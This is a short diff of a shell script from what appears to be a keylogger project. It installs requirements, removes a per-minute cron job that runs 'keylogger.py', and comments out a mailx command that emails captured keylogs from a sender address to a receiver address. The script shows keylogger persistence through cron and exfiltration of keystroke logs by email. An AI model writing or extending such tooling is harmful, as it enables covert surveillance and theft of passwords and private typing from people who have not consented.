@@ -19,6 +19,5 @@ python3 -m pip install -r requirements.txt
 # rm cronjob
 crontab -u $USER -l | grep -v '* * * * * python3 keylogger.py'  | crontab -u $USER -
 
-
-echo hi.tmp | mailx -s "keylogs $(date)" -r sender_email@gmail.com receiver_email@gmail.com
+# echo hi.tmp | mailx -s "keylogs $(date)" -r sender_email@gmail.com receiver_email@gmail.com
 
